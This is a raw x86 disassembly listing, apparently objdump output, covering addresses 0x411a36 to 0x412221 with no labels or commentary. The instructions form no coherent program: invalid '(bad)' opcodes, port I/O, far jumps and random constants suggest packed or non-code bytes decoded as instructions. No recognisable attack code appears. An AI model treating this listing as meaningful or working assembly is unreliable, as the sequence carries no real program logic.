  411a36:	dec    edi
  411a37:	sbb    al,0x80
  411a39:	sub    eax,0xdab81400
  411a3e:	daa    
  411a3f:	das    
  411a40:	sti    
  411a41:	mov    BYTE PTR [edx-0x1841527d],ch
  411a47:	sub    BYTE PTR [edi+0x7964e036],0x26
  411a4e:	(bad)  
  411a4f:	jb     0x411a5a
  411a51:	mov    bh,0xdd
  411a53:	add    eax,0x81272e5a
  411a58:	ret    
  411a59:	mov    WORD PTR [edi],es
  411a5b:	(bad)  
  411a5c:	rol    DWORD PTR [eax-0x28],cl
  411a5f:	mov    eax,0x562ce61
  411a64:	or     eax,0x3cfef0cc
  411a69:	loopne 0x411a80
  411a6b:	adc    eax,0xe174538e
  411a70:	mov    BYTE PTR [ebp+0x7c],bl
  411a73:	xchg   edx,eax
  411a74:	jle    0x411a4e
  411a76:	and    eax,0x1b4aa2f2
  411a7b:	ret    
  411a7c:	nop
  411a7d:	dec    esi
  411a7e:	stc    
  411a7f:	gs cdq 
  411a81:	or     edx,DWORD PTR [esi]
  411a83:	jo     0x411a3b
  411a85:	add    eax,0x77750489
  411a8a:	test   BYTE PTR [ecx-0x192a6317],dh
  411a90:	jle    0x411a96
  411a92:	clc    
  411a93:	sub    dh,ch
  411a95:	xor    bl,BYTE PTR [eax+0x65]
  411a98:	pusha  
  411a99:	or     al,0xd0
  411a9b:	aam    0x58
  411a9d:	adc    eax,0x8034690a
  411aa2:	mov    cl,0x1c
  411aa4:	jge    0x411ad3
  411aa6:	and    eax,0x7e6c5299
  411aab:	test   DWORD PTR [ebp+esi*1-0x565d614b],edx
  411ab2:	pop    eax
  411ab3:	adc    dh,0xa7
  411ab6:	or     al,0x1a
  411ab8:	dec    DWORD PTR [edx+0x15]
  411abb:	jne    0x411b29
  411abd:	aad    0x62
  411abf:	xchg   ebx,eax
  411ac0:	jmp    0x5443acd5
  411ac5:	sub    esp,esp
  411ac7:	addr16 add al,0xd2
  411aca:	xchg   esp,eax
  411acb:	adc    DWORD PTR [ecx],0x2c712d51
  411ad1:	int    0x76
  411ad3:	ja     0x411afa
  411ad5:	xchg   ebx,eax
  411ad6:	lea    ebp,ds:0x8fd01be2
  411adc:	xor    BYTE PTR [edi+0x1a],dl
  411adf:	cmp    al,0x50
  411ae1:	add    bh,al
  411ae3:	sbb    DWORD PTR [edx+0xa],esi
  411ae6:	out    0xc0,eax
  411ae8:	pop    edi
  411ae9:	sbb    eax,0xfb41b71f
  411aee:	xor    al,0x24
  411af0:	mov    cl,BYTE PTR [eax-0xe]
  411af3:	pop    esi
  411af4:	std    
  411af5:	imul   esi,eax,0x30daa6b8
  411afb:	push   DWORD PTR [edi-0x4f]
  411afe:	call   0x29e0:0xc3557e2
  411b05:	fidivr WORD PTR ds:0xe0774cb7
  411b0b:	push   edi
  411b0c:	xchg   BYTE PTR [esi+esi*4+0x29],ah
  411b10:	and    edx,eax
  411b12:	pop    ebp
  411b13:	icebp  
  411b14:	jmp    0xb7b6ac18
  411b19:	cmp    ecx,DWORD PTR [eax+0x50]
  411b1c:	xchg   ebx,eax
  411b1d:	(bad)  
  411b1f:	lods   eax,DWORD PTR ds:[esi]
  411b20:	test   DWORD PTR [ecx-0x2c],esi
  411b23:	adc    BYTE PTR [edx-0x5b0de57a],0x7d
  411b2a:	fucomi st,st(5)
  411b2c:	pop    esi
  411b2d:	out    0x16,eax
  411b2f:	mov    cl,0x82
  411b31:	retf   
  411b32:	inc    edx
  411b33:	int    0x40
  411b35:	lods   eax,DWORD PTR ds:[esi]
  411b36:	or     bh,BYTE PTR [ebp-0x1f]
  411b39:	es in  eax,dx
  411b3b:	clc    
  411b3c:	push   esp
  411b3d:	dec    esi
  411b3e:	out    0x59,eax
  411b40:	mov    dh,0xe4
  411b42:	sub    eax,DWORD PTR [ebp+0x1]
  411b45:	popf   
  411b46:	mov    bl,0xa5
  411b48:	(bad)  
  411b4a:	mov    ebx,0xd892c370
  411b4f:	jne    0x411b87
  411b51:	or     ch,BYTE PTR [edi+0x2b]
  411b54:	and    eax,0x72398b00
  411b59:	ror    bl,0x88
  411b5c:	adc    DWORD PTR [esp+esi*4],0xf090bcab
  411b63:	xchg   ebx,eax
  411b64:	lods   al,BYTE PTR ds:[esi]
  411b65:	adc    bl,BYTE PTR [edx+0x8e48bad]
  411b6b:	sub    edx,DWORD PTR [ecx]
  411b6d:	clc    
  411b6e:	test   eax,0xfb87dd4d
  411b73:	push   0x309e9a26
  411b78:	faddp  st(0),st
  411b7a:	mov    ebx,0x5f68ae50
  411b7f:	(bad)
  411b84:	scas   al,BYTE PTR es:[edi]
  411b85:	dec    esp
  411b86:	ja     0x5059a2ac
  411b8c:	push   esi
  411b8d:	push   esp
  411b8e:	jmp    0x411b27
  411b90:	jo     0x411bbb
  411b92:	mov    al,ds:0x6b4cab8d
  411b97:	or     BYTE PTR [ebp+0x6301cfc0],cl
  411b9d:	add    ch,BYTE PTR [ebx+edi*2-0xd]
  411ba1:	mov    ebp,0xaf8081d0
  411ba6:	mov    bl,0x3a
  411ba8:	sub    dh,cl
  411baa:	(bad)  
  411bab:	mov    edx,0xee4e46c6
  411bb0:	test   DWORD PTR [edx],0x62578c5d
  411bb6:	stos   DWORD PTR es:[edi],eax
  411bb7:	rcl    DWORD PTR [ebx+0x4a],1
  411bba:	mov    ecx,0x1652e9d6
  411bbf:	aas    
  411bc0:	fldcw  WORD PTR [edx]
  411bc2:	xor    DWORD PTR [edi+0x58],eax
  411bc5:	sbb    al,0xad
  411bc7:	sar    al,cl
  411bc9:	test   BYTE PTR [ebx],bl
  411bcb:	adc    al,0x41
  411bcd:	std    
  411bce:	jge    0x411c30
  411bd0:	cmp    ch,BYTE PTR [edi+0x3685e9c9]
  411bd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bd7:	das    
  411bd8:	add    ebx,ecx
  411bda:	cmp    BYTE PTR [esi],dl
  411bdc:	scas   al,BYTE PTR es:[edi]
  411bdd:	adc    al,0xd0
  411bdf:	mov    esi,0xe939345
  411be4:	cli    
  411be5:	fnstcw WORD PTR [ebx+0x1c7999ba]
  411beb:	and    DWORD PTR [eax-0x1e],0xabdb48bd
  411bf2:	cld    
  411bf3:	xchg   BYTE PTR [ecx-0x778b46dd],al
  411bf9:	loop   0x411bf0
  411bfb:	std    
  411bfc:	or     esp,DWORD PTR [ecx+0x485fc373]
  411c02:	add    ch,BYTE PTR [edi]
  411c04:	inc    ebp
  411c05:	lods   al,BYTE PTR ds:[esi]
  411c06:	mov    al,ds:0x2e89a2c2
  411c0b:	ss pop eax
  411c0d:	in     eax,0x21
  411c0f:	pop    es
  411c10:	jg     0x411c0d
  411c12:	(bad)  
  411c13:	enter  0xc5e3,0x62
  411c17:	ret    
  411c18:	arpl   WORD PTR [ebp+0x6],bp
  411c1b:	sbb    al,0x7
  411c1d:	inc    esp
  411c1e:	lods   eax,DWORD PTR ds:[esi]
  411c1f:	pop    eax
  411c20:	test   edx,0xb4ea720a
  411c26:	and    BYTE PTR [bp+di+0x33],bh
  411c2a:	pop    ds
  411c2b:	rcl    DWORD PTR [ebx-0x11681cad],0xad
  411c32:	aas    
  411c33:	inc    ebx
  411c34:	icebp  
  411c35:	lea    eax,[edi-0x3a26a163]
  411c3b:	pusha  
  411c3c:	aas    
  411c3d:	mov    bh,0x41
  411c3f:	push   ecx
  411c40:	jb     0x411c13
  411c42:	add    BYTE PTR [esi-0x3a89c8ed],cl
  411c48:	gs in  eax,dx
  411c4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c4b:	fsubr  st,st(4)
  411c4d:	pmulhuw mm1,QWORD PTR [ebp-0x3d08a72f]
  411c54:	popa   
  411c55:	test   DWORD PTR [edi+0x2a9e68cc],edi
  411c5b:	push   cs
  411c5c:	and    eax,0x6addcf83
  411c61:	stos   DWORD PTR es:[edi],eax
  411c62:	mov    eax,0x61b23f2e
  411c67:	adc    eax,0xec89059e
  411c6c:	dec    edi
  411c6d:	mov    WORD PTR [edx+0x40300b3f],fs
  411c73:	sub    al,0x5a
  411c75:	sahf   
  411c76:	mov    ds:0x718f66e1,eax
  411c7b:	iret   
  411c7c:	cld    
  411c7d:	repnz shr DWORD PTR [esi+ecx*4+0x71],1
  411c82:	push   0xa39681c5
  411c87:	loope  0x411c43
  411c89:	in     eax,dx
  411c8a:	punpckhdq mm1,QWORD PTR [ecx+0x74797bfb]
  411c91:	fwait
  411c92:	adc    eax,DWORD PTR [edx]
  411c94:	and    BYTE PTR [esi-0x42],dl
  411c97:	pusha  
  411c98:	call   0x48e5:0x3d8b02a6
  411c9f:	jnp    0x411ca5
  411ca1:	fs retf 0x6810
  411ca5:	rcl    BYTE PTR [esi],cl
  411ca7:	outs   dx,DWORD PTR ds:[esi]
  411ca8:	aam    0x14
  411caa:	cs jb  0x411cc2
  411cad:	repz out dx,al
  411caf:	imul   esp,DWORD PTR [ebp-0x7652f368],0x58
  411cb6:	dec    esp
  411cb7:	shl    DWORD PTR [esi-0x3c21ab38],cl
  411cbd:	out    dx,eax
  411cbe:	gs add eax,0x33124b35
  411cc4:	mov    DWORD PTR [ebp-0x31],esp
  411cc7:	mov    BYTE PTR [ecx+0x3c0c6787],0x3e
  411cce:	xor    eax,0x67d5ef8d
  411cd3:	lods   al,BYTE PTR ds:[esi]
  411cd4:	and    BYTE PTR [eax],al
  411cd6:	fwait
  411cd7:	and    al,0x56
  411cd9:	fld    TBYTE PTR [ecx]
  411cdb:	xchg   ebx,eax
  411cdc:	hlt    
  411cdd:	aaa    
  411cde:	jo     0x411cd2
  411ce0:	push   es
  411ce1:	in     eax,0xbc
  411ce3:	aad    0x32
  411ce5:	mov    edi,0xb23a3f7b
  411cea:	adc    ch,BYTE PTR [edi]
  411cec:	sub    eax,0x411907f
  411cf1:	int3   
  411cf2:	loopne 0x411ca5
  411cf4:	pop    eax
  411cf5:	xor    al,0xa9
  411cf7:	(bad)  
  411cf8:	adc    dh,BYTE PTR [ecx+0x5e]
  411cfb:	imul   ebp,DWORD PTR [eax+0x69],0xffffff9e
  411cff:	scas   al,BYTE PTR es:[edi]
  411d00:	enter  0x5ad5,0x67
  411d04:	push   esp
  411d05:	mov    dh,0xa9
  411d07:	stc    
  411d08:	mov    WORD PTR [ebp-0x2c99c05c],fs
  411d0e:	js     0x411d48
  411d10:	sub    DWORD PTR [edx+0x30],ebp
  411d13:	and    WORD PTR [ecx-0x44],0xe509
  411d19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d1a:	xchg   dh,cl
  411d1c:	xchg   BYTE PTR [eax+0x13c449c2],al
  411d22:	aad    0x8a
  411d24:	aas    
  411d25:	xchg   esp,eax
  411d26:	mov    ebx,edx
  411d28:	or     al,0xf8
  411d2a:	push   esp
  411d2b:	retf   
  411d2c:	sub    BYTE PTR ds:0x1726ac89,cl
  411d32:	jl     0x411d88
  411d34:	arpl   WORD PTR [ebx],cx
  411d36:	ret    0xab37
  411d39:	mov    ebx,0xe02666c9
  411d3e:	(bad)  
  411d3f:	pop    eax
  411d40:	icebp  
  411d41:	dec    ecx
  411d42:	xchg   edi,eax
  411d43:	pop    edx
  411d44:	scas   eax,DWORD PTR es:[edi]
  411d45:	fisubr DWORD PTR [ecx+0x669e2f60]
  411d4b:	lods   al,BYTE PTR ds:[esi]
  411d4c:	pop    ebx
  411d4d:	lods   al,BYTE PTR ds:[esi]
  411d4e:	loope  0x411d08
  411d50:	aad    0xae
  411d52:	lahf   
  411d53:	pushf  
  411d54:	inc    edi
  411d55:	cwde   
  411d56:	outs   dx,DWORD PTR ds:[esi]
  411d57:	sahf   
  411d58:	add    esi,DWORD PTR [esi-0x7b]
  411d5b:	shr    ebp,0x5f
  411d5e:	in     al,0x66
  411d60:	inc    ebp
  411d61:	scas   eax,DWORD PTR es:[edi]
  411d62:	mov    dl,0x4a
  411d64:	cmp    eax,DWORD PTR [eax-0x5d]
  411d67:	(bad)  
  411d68:	cmp    eax,0x8afabf62
  411d6d:	xor    ebx,DWORD PTR [ebx+0x1ceb6988]
  411d73:	ds push eax
  411d75:	pusha  
  411d76:	loop   0x411d34
  411d78:	lds    ecx,FWORD PTR [edx-0x55]
  411d7b:	sti    
  411d7c:	mov    bh,0xe
  411d7e:	pushf  
  411d7f:	ds dec eax
  411d81:	cwde   
  411d82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d83:	cli    
  411d84:	mov    ds:0x5c47f57d,eax
  411d89:	lods   al,BYTE PTR ds:[esi]
  411d8a:	ror    DWORD PTR [ebx],cl
  411d8c:	mov    edx,ebx
  411d8e:	push   ss
  411d8f:	cwde   
  411d90:	lds    edi,FWORD PTR ds:0x7e5b1095
  411d96:	xor    BYTE PTR [ebx-0x31],al
  411d99:	(bad)  
  411d9b:	outs   dx,BYTE PTR ds:[esi]
  411d9c:	lds    ebx,FWORD PTR ds:0xa0a54be3
  411da2:	call   0xccc7d645
  411da7:	arpl   WORD PTR [edi-0x19963e5d],sp
  411dad:	out    dx,eax
  411dae:	and    dl,BYTE PTR [esi-0x71]
  411db1:	stc    
  411db2:	push   ss
  411db3:	out    dx,al
  411db4:	test   al,0xbe
  411db6:	xchg   esp,eax
  411db7:	xor    eax,0x7ab223e7
  411dbc:	loopne 0x411ddc
  411dbe:	das    
  411dbf:	fdivr  QWORD PTR [ebx-0x3f]
  411dc2:	(bad)  
  411dc3:	rol    DWORD PTR [edx+ecx*2-0x59c08589],0x27
  411dcb:	mov    eax,0x95d3ff9f
  411dd0:	or     ebx,0x7a
  411dd3:	inc    ebp
  411dd4:	and    bl,BYTE PTR [esi+0x47]
  411dd7:	out    0x52,al
  411dd9:	adc    ebp,DWORD PTR [edi+0x3c01c7a3]
  411ddf:	add    dl,BYTE PTR [eax-0x79dec6fc]
  411de5:	and    al,0xeb
  411de7:	pop    esi
  411de8:	sbb    al,0x5a
  411dea:	stc    
  411deb:	fidivr DWORD PTR [ebp+0xd65c575]
  411df1:	or     edx,ebp
  411df3:	sbb    bh,0x81
  411df6:	xchg   BYTE PTR es:0x61d7ebc8,dh
  411dfd:	sub    DWORD PTR [ecx+0x12],esp
  411e00:	fs mov al,0xbb
  411e03:	(bad)  
  411e04:	clc    
  411e05:	cs adc al,0x1
  411e08:	mov    edi,0x76aee51c
  411e0d:	xchg   DWORD PTR [edi+0x3c],eax
  411e10:	sahf   
  411e11:	icebp  
  411e12:	push   es
  411e13:	rcr    BYTE PTR [edx-0x7aa29dcc],cl
  411e19:	ret    0x6963
  411e1c:	push   0xa19a4a96
  411e21:	mov    ds:0xb6bfead9,eax
  411e26:	mov    ch,0xd9
  411e28:	jns    0x411dc1
  411e2a:	lods   al,BYTE PTR ds:[esi]
  411e2b:	xor    al,0x68
  411e2d:	fist   WORD PTR ds:0x77e686a1
  411e33:	mov    DWORD PTR [esi-0x69],esp
  411e36:	aas    
  411e37:	add    eax,0x6c7fd7ce
  411e3c:	dec    eax
  411e3d:	jl     0x411e86
  411e3f:	add    cl,dl
  411e41:	cli    
  411e42:	push   ss
  411e43:	sub    al,0xb5
  411e45:	mov    edx,0x1a478dca
  411e4a:	loop   0x411eb9
  411e4c:	fsubr  QWORD PTR [ecx+0x30a361d0]
  411e52:	sbb    al,0xbd
  411e54:	push   0x6a
  411e56:	ret    
  411e57:	sub    DWORD PTR [ebp-0x7a],0xffffffa2
  411e5b:	dec    ebp
  411e5c:	repnz stos DWORD PTR es:[edi],eax
  411e5e:	pushf  
  411e5f:	lods   al,BYTE PTR ds:[esi]
  411e60:	add    eax,0x1fcaeb9f
  411e65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e66:	jge    0x411ee6
  411e68:	hlt    
  411e69:	dec    ebp
  411e6a:	mov    ebp,0xbc415672
  411e6f:	xlat   BYTE PTR ds:[ebx]
  411e70:	test   DWORD PTR [edi-0x1f],edx
  411e73:	and    BYTE PTR [ebx],al
  411e75:	ret    0x4aac
  411e78:	dec    esi
  411e79:	cmp    edi,DWORD PTR [ebp-0x4657084b]
  411e7f:	dec    esi
  411e80:	faddp  st(4),st
  411e82:	das    
  411e83:	sub    eax,DWORD PTR [ebx-0x37]
  411e86:	cmp    eax,0xcd61df3f
  411e8b:	cwde   
  411e8c:	pop    esi
  411e8d:	in     al,0x99
  411e8f:	mul    ebp
  411e91:	pusha  
  411e92:	mov    esi,edi
  411e94:	std    
  411e95:	fidiv  WORD PTR [edx]
  411e97:	sahf   
  411e98:	sar    dh,cl
  411e9a:	imul   BYTE PTR [ecx+0x5a30b5b0]
  411ea0:	xchg   esi,eax
  411ea1:	mov    al,ds:0x81fd7b5f
  411ea6:	cs mov edx,0x3c9feb43
  411eac:	cli    
  411ead:	dec    DWORD PTR [ebx-0x66ac71a7]
  411eb3:	jg     0x411ed6
  411eb5:	data16 mov ah,0xc4
  411eb8:	sysret 
  411eba:	das    
  411ebb:	or     dh,dl
  411ebd:	pushf  
  411ebe:	lods   eax,DWORD PTR ds:[esi]
  411ebf:	xchg   edi,eax
  411ec0:	cmp    eax,0x9303e3ee
  411ec5:	fsub   QWORD PTR ss:[ebx+0x7fe27438]
  411ecc:	js     0x411e81
  411ece:	lods   eax,DWORD PTR ds:[esi]
  411ecf:	call   0xd8f9850
  411ed4:	cmp    esp,DWORD PTR [edi+0x316909e]
  411eda:	push   ss
  411edb:	push   ss
  411edc:	push   es
  411edd:	or     BYTE PTR [ebx],dl
  411edf:	inc    ebp
  411ee0:	mov    al,ds:0x8e048778
  411ee5:	jbe    0x411f2f
  411ee7:	(bad)  
  411ee8:	xor    eax,0x572d8afa
  411eed:	mov    bh,0x29
  411eef:	sar    cl,1
  411ef1:	neg    DWORD PTR [ecx+ebx*4]
  411ef4:	daa    
  411ef5:	inc    esp
  411ef6:	popf   
  411ef7:	sbb    ebp,DWORD PTR [edx+0x2c]
  411efa:	jg     0x411f0b
  411efc:	xlat   BYTE PTR ds:[ebx]
  411efd:	pop    eax
  411efe:	bound  di,DWORD PTR [ecx]
  411f01:	mov    edx,0xfd0b15b
  411f06:	jne    0x411eed
  411f08:	push   ds
  411f09:	daa    
  411f0a:	jnp    0x411eb5
  411f0c:	inc    ecx
  411f0d:	or     al,0xc4
  411f0f:	mov    eax,DWORD PTR [edx]
  411f11:	mov    al,0xdc
  411f13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f14:	xchg   ecx,edx
  411f16:	cmp    bl,BYTE PTR ds:0xf4a24f1
  411f1c:	ss or  edi,ebx
  411f1f:	adc    al,0x24
  411f21:	sub    DWORD PTR [ebp-0x21],ebp
  411f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f25:	pop    ebx
  411f26:	sbb    BYTE PTR [ecx-0x10],cl
  411f29:	sub    ch,BYTE PTR [ecx]
  411f2b:	cld    
  411f2c:	fsubp  st(7),st
  411f2e:	or     bl,dl
  411f30:	dec    edx
  411f31:	int3   
  411f32:	pop    ebp
  411f33:	xlat   BYTE PTR ds:[ebx]
  411f34:	test   edi,esi
  411f36:	rcl    BYTE PTR [ebx],1
  411f38:	pushf  
  411f39:	stos   BYTE PTR es:[edi],al
  411f3a:	sub    bh,BYTE PTR [ebp+0x92308fd]
  411f40:	(bad)  
  411f41:	xor    esi,DWORD PTR [esi]
  411f43:	cmp    BYTE PTR [edi-0x62b2f802],dl
  411f49:	loopne 0x411f0c
  411f4b:	std    
  411f4c:	mov    bl,0xaa
  411f4e:	in     eax,0xaf
  411f50:	jl     0x411f91
  411f52:	gs mov ebp,0xfc1cb4ef
  411f58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f59:	mov    ebx,0x359082d4
  411f5e:	aaa    
  411f5f:	scas   al,BYTE PTR es:[edi]
  411f60:	push   edi
  411f61:	xchg   BYTE PTR [esi+0x6ed58d63],cl
  411f67:	jno    0x411fa1
  411f69:	mov    ds:0xd01f08cb,al
  411f6e:	mov    esi,DWORD PTR [edx]
  411f70:	fisubr DWORD PTR [ecx]
  411f72:	sahf   
  411f73:	inc    ebx
  411f74:	mov    dl,0xda
  411f76:	call   0x28a:0x53ecf8fa
  411f7d:	aam    0xab
  411f7f:	div    BYTE PTR [esi+0xf3f1996]
  411f85:	cmp    BYTE PTR [ebp+0x5931ae75],0xf0
  411f8c:	xor    bh,BYTE PTR [ebx+ebp*8]
  411f8f:	and    esi,esp
  411f91:	mov    BYTE PTR ds:0xde3a7c9d,ch
  411f97:	or     ebp,DWORD PTR [edi+0x65c4f07]
  411f9d:	call   0x2d8d9b8f
  411fa2:	je     0x411f6e
  411fa4:	rol    dh,0x2
  411fa7:	jno    0x41200c
  411fa9:	sub    al,0x20
  411fab:	xor    ebx,DWORD PTR [eax]
  411fad:	and    ch,al
  411faf:	and    eax,0x1395e078
  411fb4:	jnp    0x411fa4
  411fb6:	push   es
  411fb7:	add    DWORD PTR [edx],ebp
  411fb9:	xchg   ch,cl
  411fbb:	sbb    ebx,DWORD PTR [esi+0x6f2fe81f]
  411fc1:	and    dl,BYTE PTR [ebx]
  411fc3:	push   edx
  411fc4:	cmp    eax,0xc7a0117d
  411fc9:	mov    ebp,0x103435ef
  411fce:	jo     0x411fb6
  411fd0:	mov    DWORD PTR [edx+0x61],esi
  411fd3:	sub    BYTE PTR [ebp+edi*1+0x2a12f21],dh
  411fda:	or     eax,0xfe88099b
  411fdf:	mov    ah,0x36
  411fe1:	push   ss
  411fe2:	push   ds
  411fe3:	into   
  411fe4:	test   eax,0x4dacce2c
  411fe9:	jmp    0x77af:0x341c8938
  411ff0:	sbb    BYTE PTR [esp+ebp*8],0x57
  411ff4:	jbe    0x411fb7
  411ff6:	pop    esp
  411ff7:	in     eax,0x27
  411ff9:	mov    ds:0xaaa685d9,al
  411ffe:	mul    DWORD PTR [eax+eax*2]
  412001:	fs pop esi
  412003:	out    0x1f,al
  412005:	fsub   QWORD PTR [edi]
  412007:	cwde   
  412008:	pop    ds
  412009:	cmp    esp,DWORD PTR [eax-0x153586c4]
  41200f:	sbb    DWORD PTR [esi-0x65],edi
  412012:	mov    ah,0x8c
  412014:	add    DWORD PTR [ebx+0x5a],0x6b94eb7c
  41201b:	inc    ebx
  41201c:	or     eax,0xa5dca7ca
  412021:	sbb    eax,0x6332ae75
  412026:	cmp    eax,0x5834e78c
  41202b:	push   edi
  41202c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41202d:	adc    DWORD PTR [edx+0x69],ebp
  412030:	sub    dh,BYTE PTR [eax-0x5b7f804]
  412036:	popa   
  412037:	push   ecx
  412038:	outs   dx,BYTE PTR ds:[esi]
  412039:	out    dx,eax
  41203a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41203b:	push   ds
  41203c:	std    
  41203d:	imul   esi,DWORD PTR [esi+0x65dc5980],0xffffffee
  412044:	addr16 (bad) 
  412048:	pop    es
  412049:	sub    DWORD PTR [ecx],edx
  41204b:	loopne 0x412059
  41204d:	out    dx,al
  41204e:	push   ebx
  41204f:	iret   
  412050:	jae    0x412095
  412052:	mov    BYTE PTR [ecx],ch
  412054:	loop   0x412064
  412056:	sbb    dh,dh
  412058:	mov    ecx,0x13f05e52
  41205d:	sub    eax,0x1cfd1bdc
  412062:	stos   BYTE PTR es:[edi],al
  412063:	mov    al,0x5d
  412065:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412066:	out    dx,al
  412067:	int    0xb9
  412069:	mov    bl,0x1a
  41206b:	dec    eax
  41206c:	xlat   BYTE PTR ds:[ebx]
  41206d:	fs inc esi
  41206f:	out    dx,eax
  412070:	xor    ah,BYTE PTR [ecx]
  412072:	in     eax,dx
  412073:	jns    0x412045
  412075:	and    al,BYTE PTR [ebx+0x6d]
  412078:	or     BYTE PTR [ebp-0x9],al
  41207b:	sbb    DWORD PTR ss:[ecx+0x70],0x35
  412080:	dec    esp
  412081:	das    
  412082:	fstp   DWORD PTR [edi]
  412084:	ffree  st(6)
  412086:	mov    cl,dh
  412088:	out    0x3b,eax
  41208a:	mov    al,ds:0x66adb823
  41208f:	mov    edx,0x71259b59
  412094:	cli    
  412095:	popa   
  412096:	mov    ebp,0x3d9a0933
  41209b:	jo     0x412038
  41209d:	pop    edi
  41209e:	das    
  41209f:	push   edx
  4120a0:	icebp  
  4120a1:	(bad)  
  4120a3:	pop    ss
  4120a4:	cmp    dl,BYTE PTR [edi-0x7fa95cbd]
  4120aa:	sub    al,0xaf
  4120ac:	(bad)  [edx]
  4120ae:	aad    0x2f
  4120b0:	iret   
  4120b1:	push   esi
  4120b2:	inc    ebx
  4120b3:	loope  0x41206c
  4120b5:	mov    ch,0x4e
  4120b7:	jno    0x4120fd
  4120b9:	push   edx
  4120ba:	std    
  4120bb:	and    DWORD PTR [ecx+0x2b8be3ac],edi
  4120c1:	mov    esp,0x518299e1
  4120c6:	mov    ecx,0x3c35d01b
  4120cb:	push   eax
  4120cc:	leave  
  4120cd:	nop
  4120ce:	pop    esp
  4120cf:	sbb    BYTE PTR [edi+0x164f3c87],0x3
  4120d6:	ret    0x3ae6
  4120d9:	fldenv [ebx-0x2f]
  4120dc:	dec    esi
  4120dd:	adc    eax,0x7923db7e
  4120e2:	jns    0x4120e9
  4120e4:	and    al,0xcb
  4120e6:	push   ds
  4120e7:	jmp    0x8b5e:0x95303952
  4120ee:	cmp    al,0xa0
  4120f0:	and    al,0x70
  4120f2:	clc    
  4120f3:	and    al,0x63
  4120f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120f6:	nop
  4120f7:	jnp    0x4120a9
  4120f9:	dec    esi
  4120fa:	and    DWORD PTR [edx-0xe5c5b8e],ebx
  412100:	stc    
  412101:	mov    edi,0x63b4581c
  412106:	cmp    DWORD PTR [ebx],esi
  412108:	aad    0xa8
  41210a:	enter  0xbb2d,0x87
  41210e:	xor    eax,0x9e284120
  412113:	or     edi,DWORD PTR [edi-0x5308fb02]
  412119:	out    0x94,eax
  41211b:	add    BYTE PTR [edi+0x5a],ah
  41211e:	pop    es
  41211f:	scas   eax,DWORD PTR es:[edi]
  412120:	xor    DWORD PTR [edi+ecx*2-0x2ae7f7c2],eax
  412127:	pop    edi
  412128:	xor    DWORD PTR [esi],0xffffffec
  41212b:	sbb    eax,0x9016130f
  412130:	jbe    0x4120c4
  412132:	ds add ecx,0xffffff97
  412136:	call   0xc035:0x8049a788
  41213d:	dec    ebp
  41213e:	in     eax,dx
  41213f:	push   0x58
  412141:	pop    ss
  412142:	arpl   WORD PTR [ecx+0xd803a52],bp
  412148:	and    eax,0x7070b9f4
  41214d:	dec    esi
  41214e:	inc    ebp
  41214f:	div    DWORD PTR [ecx]
  412151:	cmc    
  412152:	jmp    0xf909:0x358ec495
  412159:	enter  0x509f,0x73
  41215d:	mul    DWORD PTR [ebx+0x11]
  412160:	mov    al,ds:0xa4d0031d
  412165:	or     ecx,DWORD PTR [edx]
  412167:	xchg   ecx,eax
  412168:	cmp    DWORD PTR [ebx],edx
  41216a:	pop    ebp
  41216b:	and    eax,0x3d49e97d
  412170:	ds jecxz 0x4121d7
  412173:	inc    ebx
  412174:	js     0x4120fb
  412176:	xlat   BYTE PTR ds:[ebx]
  412177:	push   edi
  412178:	popa   
  412179:	mov    cl,0xcc
  41217b:	pop    esi
  41217c:	push   es
  41217d:	aad    0x34
  41217f:	dec    eax
  412180:	ret    
  412181:	mov    dl,0x89
  412183:	or     eax,0x441f2f52
  412188:	mov    ds:0x94f65241,al
  41218d:	push   esp
  41218e:	xor    dh,BYTE PTR [ecx+0x4ff72489]
  412194:	(bad)  
  412195:	ror    ebp,cl
  412197:	in     eax,dx
  412198:	in     al,0x6
  41219a:	scas   eax,DWORD PTR es:[edi]
  41219b:	call   0x6216c24b
  4121a0:	mov    DWORD PTR [eax+0x57fe9f21],edi
  4121a6:	mov    WORD PTR [ebx+0x36435572],es
  4121ac:	arpl   WORD PTR [edx],dx
  4121ae:	shl    ebx,1
  4121b0:	aad    0x38
  4121b2:	mov    ebp,0x5c632db3
  4121b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121b8:	retf   0xa9e3
  4121bb:	mov    ebx,0xbe78a9f0
  4121c0:	shl    dh,1
  4121c2:	test   eax,0xe35bd814
  4121c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121c8:	fimul  WORD PTR [ebx-0x7cae6fb8]
  4121ce:	loope  0x4121c6
  4121d0:	xor    eax,0x841f9d97
  4121d5:	pop    ss
  4121d6:	xor    esp,DWORD PTR [esi]
  4121d8:	cmc    
  4121d9:	cmp    al,BYTE PTR [esi+0x36]
  4121dc:	sub    BYTE PTR [ebx],0x77
  4121df:	dec    eax
  4121e0:	dec    edi
  4121e1:	jne    0x41218e
  4121e3:	push   0x3b926f9b
  4121e8:	frndint 
  4121ea:	(bad)  
  4121eb:	test   DWORD PTR [edx-0x683685a],edi
  4121f1:	mov    ah,0xb5
  4121f3:	sti    
  4121f4:	push   ebp
  4121f5:	aad    0xa0
  4121f7:	ins    DWORD PTR es:[edi],dx
  4121f8:	jo     0x412244
  4121fa:	in     eax,0x1c
  4121fc:	xchg   edi,eax
  4121fd:	sub    esi,ebx
  4121ff:	mov    dh,BYTE PTR [edx-0x659395c7]
  412205:	dec    esp
  412206:	push   esp
  412207:	cmp    BYTE PTR [ebx+ecx*4],0x45
  41220b:	or     eax,0x896cc693
  412210:	mov    al,ds:0x233a3f30
  412215:	mov    dl,0xec
  412217:	push   ss
  412218:	adc    ah,BYTE PTR [ecx]
  41221a:	ja     0x4121ca
  41221c:	scas   al,BYTE PTR es:[edi]
  41221d:	jl     0x4121ff
  41221f:	xchg   edx,eax
  412220:	pop    ecx
  412221:	cmp    ch,BYTE PTR [eax+0x34]
